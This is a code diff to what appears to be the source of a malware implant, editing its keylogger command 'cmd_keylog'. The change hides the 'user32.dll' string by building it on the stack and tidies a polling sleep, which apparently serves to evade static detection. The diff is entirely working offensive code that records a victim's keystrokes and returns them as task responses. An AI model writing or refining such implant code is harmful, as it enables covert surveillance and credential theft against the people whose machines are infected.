@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_KEYLOG
 
@@ -27,7 +28,8 @@ auto declfn starburst::cmd_keylog(
 
     DBG_PRINT( inst, "cmd_keylog: duration=%u seconds\n", duration );
 
-    auto h_user32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) );
+    STK_USER32(_n);
+    auto h_user32 = inst.kernel32.LoadLibraryA( _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
@@ -166,10 +168,7 @@ auto declfn starburst::cmd_keylog(
             }
         }
 
-        // sleep ~50ms between polls
-        LARGE_INTEGER delay;
-        delay.QuadPart = -500000LL;  // 50ms in 100ns units, negative = relative
-        inst.ntdll.NtDelayExecution( FALSE, &delay );
+        SleepMs( 50 );
     }
 
     buffer[buf_off] = '\0';
